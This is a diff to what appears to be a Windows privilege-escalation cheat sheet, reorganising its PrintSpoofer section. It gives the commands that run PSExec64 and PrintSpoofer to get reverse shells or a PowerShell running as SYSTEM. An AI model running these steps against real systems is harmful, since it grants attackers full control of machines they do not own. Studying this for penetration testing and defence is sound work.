@@ -4181,12 +4181,13 @@ Note: This attack works on Windows 7, 8, early versions of Windows 10, and their
 - See: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
 
 **[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**
-1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
-2. Start a listener on the attacker machine
-3. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
-4. Start another listener on the attacker machine
-5. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
-
+- Usage 1
+  1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
+  2. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
+  3. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
+- Usage 2
+  1. Copy the `PrintSpoofer.exe` exploit executable over the Windows machine
+  2. `.\PrintSpoofer64.exe -i -c powershell.exe`
 
 #### <ins>getsystem</ins>
 - **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
